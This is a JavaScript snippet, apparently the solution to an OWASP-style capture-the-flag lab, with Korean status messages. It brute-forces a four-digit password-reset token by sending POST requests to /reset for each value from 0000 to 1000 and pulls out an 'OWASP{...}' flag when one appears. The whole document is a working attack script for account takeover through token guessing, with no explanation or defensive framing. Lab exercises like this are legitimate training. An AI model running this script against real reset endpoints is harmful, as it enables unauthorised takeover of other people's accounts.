let running = false;

async function startBrute() {
  if (running) return;
  running = true;

  const btn      = document.getElementById('bruteBtn');
  const status   = document.getElementById('brute-status');
  const bar      = document.getElementById('progressBar');
  const fill     = document.getElementById('progressFill');
  const username = document.querySelector('input[name="username"]').value;

  btn.disabled      = true;
  bar.style.display = 'block';

  for (let i = 0; i <= 1000; i++) {
    const token = String(i).padStart(4, '0');
    status.textContent = '시도 중: ' + token + '  (' + i + ' / 1000)';
    fill.style.width   = ((i / 1000) * 100).toFixed(1) + '%';

    const res  = await fetch('/reset', {
      method:  'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body:    'username=' + encodeURIComponent(username) + '&token=' + token
    });
    const html = await res.text();

    if (html.includes('OWASP{')) {
      const start = html.indexOf('OWASP{');
      const end   = html.indexOf('}', start);
      const flag  = (start !== -1 && end !== -1) ? html.substring(start, end + 1) : '추출 실패';

      fill.style.width      = '100%';
      fill.style.background = '#3fb950';
      status.innerHTML =
        '<span style="color:#3fb950">✅ 토큰 발견: ' + token + '</span><br>' +
        '<div style="margin-top:10px;background:#0f2a1a;border:1px solid #238636;' +
        'border-radius:6px;padding:12px 16px;color:#3fb950;word-break:break-all;">' +
        '🚩 <b>' + flag + '</b></div>';
      btn.disabled = false;
      running = false;
      return;
    }

    await new Promise(r => setTimeout(r, 50));
  }

  status.textContent = '❌ 실패: 토큰을 찾지 못했습니다. (토큰이 만료되었을 수 있음)';
  btn.disabled = false;
  running = false;
}